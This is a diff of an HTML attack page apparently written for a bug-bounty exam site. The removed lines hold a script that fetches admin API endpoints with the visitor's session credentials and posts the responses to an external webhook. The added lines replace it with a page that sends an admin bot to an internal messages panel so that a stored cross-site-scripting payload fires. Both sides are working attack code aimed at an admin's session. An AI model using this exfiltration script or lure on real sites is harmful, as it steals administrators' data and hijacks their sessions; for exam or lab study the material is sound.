@@ -1,28 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>Diagnostic</title></head>
+<head>
+    <title>Bug Report Evidence</title>
+</head>
 <body>
+    <h1>Redirecting to Admin Panel...</h1>
     <script>
-        const webhook = "https://webhooksite.net/11c8eb00-4696-43a0-9d10-5498131d321a";
-        async function exfil(url) {
-            try {
-                const r = await fetch(url, { credentials: 'include' });
-                const d = await r.json();
-                fetch(webhook, { method: "POST", mode: "no-cors", body: JSON.stringify({ url, d })});
-            } catch (e) {}
-        }
-
-        // 1. Check for Environmental/Debug leaks
-        exfil("https://api-bugbounty-exam.hashacademy.co/api/admin/debug/env");
-        exfil("https://api-bugbounty-exam.hashacademy.co/api/admin/system/logs");
+        // We are redirecting the bot to the internal admin dashboard.
+        // If the admin sees your "Contact Us" message here, the XSS fires.
         
-        // 2. Check for the "First" booking (BK-00001) specifically
-        // Sometimes page=6 is empty, but the very first entry is the flag
-        exfil("https://api-bugbounty-exam.hashacademy.co/api/admin/bookings/69d28e841cda77b519a9550e"); // Testing Admin's own ID as a booking lookup
+        const adminPanelUrl = "https://bugbounty-exam.hashacademy.co/admin/messages";
+        
+        // Alternative target if the above doesn't work:
+        // const adminPanelUrl = "https://bugbounty-exam.hashacademy.co/admin/tickets";
 
-        // 3. The "Secret" 600-point path: Massive Export
-        // Try to trigger a CSV or JSON export which often bypasses standard filters
-        exfil("https://api-bugbounty-exam.hashacademy.co/api/admin/bookings/export");
+        setTimeout(() => {
+            window.location.href = adminPanelUrl;
+        }, 500);
     </script>
 </body>
 </html>
